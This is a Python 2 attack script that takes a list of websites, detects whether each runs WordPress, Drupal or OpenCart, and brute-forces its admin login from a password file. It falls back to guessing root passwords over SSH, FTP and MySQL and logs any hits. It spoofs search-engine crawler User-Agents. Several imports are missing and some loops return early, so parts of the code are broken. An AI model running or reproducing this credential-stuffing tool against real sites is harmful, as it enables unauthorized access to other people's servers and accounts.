import sys                                                                                                                                                              
reload(sys)                                                                                                                                                             
sys.setdefaultencoding('utf8') 
import builtwith, urlparse, time, requests, random, socket
from multiprocessing.pool import ThreadPool

try:
    file = sys.argv[1]
except:
    print('Error')
    exit()

header = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)", "Opera/9.20 (Windows NT 6.0; U; en)", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)", "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0", "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)", "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"]

def checkcms(url):
    try:
        cms = builtwith.builtwith(url)
        w = " | CMS: " + cms["cms"][0]
    except:
        w = checkencoom(url)
    return w

def checkencoom(url):
    try:
        cms = builtwith.builtwith(url)
        w = " | CMS: " + cms["ecommerce"][0]
    except:
        w = " | CMS: Not found"
    return w

def ssh(url, user):
    try:     
        url = urlparse.urlsplit(url)[1] 
        print(url)                                                                                                                           
        ip = socket.gethostbyname(url)                                                                                                                                         
        print(" Test SSH --> " + url)                                                                                                                                              
        with open("passw.txt", "r") as f:                                                                                                                                           
            lines = f.readlines()                                                                                                                                                   
            for passw in lines:                                                                                                                                                          
                try:                                                                                                                                                                      
                    passw = passw.strip()                                                                                                                                                   
                    print(passw)                                                                                                                                                            
                    s = pxssh.pxssh()                                                                                                                                                       
                    s.login (ip, user, passw, login_timeout=10)                                                                                                                             
                    s.sendline ('uname -a')                                                                                                                                                 
                    s.prompt()                                                                                                                                                              
                    s.logout()                                                                                                                                                              
                    ssh = " | IP: " + ip + " Login: " + user + " Password: " + passw  
                    return ssh                                                                                                 
                except Exception, e:                                                                                                                                                       
                    print(e)
                    return ''
    except Exception, e:                                                                                                                                                       
        print(e)
        return ''

def ftpbrute(url):
    try:
        ftp = FTP()
        url = urlparse.urlsplit(url)[1] 
        print(url)                                                                                                                           
        ip = socket.gethostbyname(url)                                                                                                                                         
        print(" Test FTP --> " + url) 
        with open("passw.txt", "r") as f:                                                                                                                                           
            lines = f.readlines()                                                                                                                                                   
            for passw in lines:                                                                                                                                                          
                try:                                                                                                                                                                      
                    passw = passw.strip() 
                    ftp.connect(ip, 21)
                    ftp.login('root', passw)
                    ftp = " | IP: " + ip + " Login: " + 'root' + " Password: " + passw  
                    return ftp    
                except Exception, e:                                                                                                                                                       
                    print(e)
                    return ''
    except Exception, e:   
        print(e)                                                                                                                                                    
        return ''    

def mysqlbrute(url):
    try:
        url = urlparse.urlsplit(url)[1] 
        print(url)                                                                                                                           
        ip = socket.gethostbyname(url) 
        print(" Test Mysql --> " + url) 
        with open("passw.txt", "r") as f:                                                                                                                                          
            lines = f.readlines()                                                                                                                                                   
            for passw in lines:                                                                                                                                                          
                try:                                                                                                                                                                      
                    passw = passw.strip() 
                    conn = mysql.connect(user='root', password=passw, host=ip)
                    conn = " | IP: " + ip + " Login: " + 'root' + " Password: " + passw  
                    return conn   
                except Exception, e:                                                                                                                                                       
                    print(e)
                    return ''
    except Exception, e:                                                                                                                                                       
        print(e)
        return ''

def brute(url, two):
    found = []
    check = False
    headers = { "Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "User-Agent": random.choice(header) }
    cms = checkcms(url)
    print(cms)
    if ('WordPress' in cms):
        url = urlparse.urljoin(url, '/') + "/wp-login.php"
        print(url)
        response = requests.get(url, headers={"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "User-Agent": random.choice(header)})
        if(response.status_code == 200):
            with open("passw.txt", "r") as f:
                lines = f.readlines()
            for passw in lines:
                passw = passw.strip()
                wp = {'log': 'drupal', 'pwd': passw, 'wp-submit': 'Login', 'redirect_to': url + '/wp-admin/' }
                response = requests.post(url, data=wp, headers={"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "User-Agent": random.choice(header)})
                if('/wp-admin' in response.url):
                    print('Hi')
                    found = ('URL: ' + url + ' -> login: admin | password: ' + passw)
                    check =True
                    break
            if check == False:
                found = (ssh(url, 'root') + ftpbrute(url) + mysqlbrute(url))
                return found
    elif('Drupal' in cms):
        url = urlparse.urljoin(url, '/') + "/user/login"
        print(url)
        response = requests.get(url, headers={"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "User-Agent": random.choice(header)})
        if(response.status_code == 200):
            with open("passw.txt", "r") as f:
                lines = f.readlines()
            for passw in lines:
                passw = passw.strip()
                print(passw)
                drupal = {'name': 'drupal', 'pass': passw, 'form_build_id': '', 'form_id': 'user_login',  'op' : 'Log in' }
                response = requests.post(url, data=drupal, headers={"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "User-Agent": random.choice(header)})
                if ('Log out' in response.content):
                    print('Hi')
                    found = ('URL: ' + url + ' -> login: admin | password: ' + passw)
                    check =True
                    break
            if check == False:
                found = (ssh(url, 'root') + ftpbrute(url) + mysqlbrute(url))
                return found
    elif('OpenCart' in cms):
        url = urlparse.urljoin(url, '/') + "/admin/index.php"
        print(url)
        response = requests.get(url, headers={"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "User-Agent": random.choice(header)})
        if(response.status_code == 200):
            with open("passw.txt", "r") as f:
                lines = f.readlines()
            for passw in lines:
                passw = passw.strip()
                opencart = { 'username': 'admin', 'password': passw }
                response = requests.post(url, data=opencart, headers={"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "User-Agent": random.choice(header)})
                if ('Logout' in response.content):
                    found = ('URL: ' + url + ' -> login: admin | password: ' + passw)
                    check = True
                    break
            if check == False:
                found = (ssh(url, 'root') + ftpbrute(url) + mysqlbrute(url))
                return found
    return found


def threads(targets, url): 
    pool = ThreadPool(processes=10)
    async_result = pool.apply_async(targets, (url, 'Admin')) # tuple of args for foo
    return_val = async_result.get()
    return return_val

try:
    with open(file, "r") as f:
        lines = f.readlines()
    for sites in lines:
        print(sites)
        found = threads(brute,sites)
        file = open('log.txt', 'a+').write(found)
except:
    print('File Not Found')
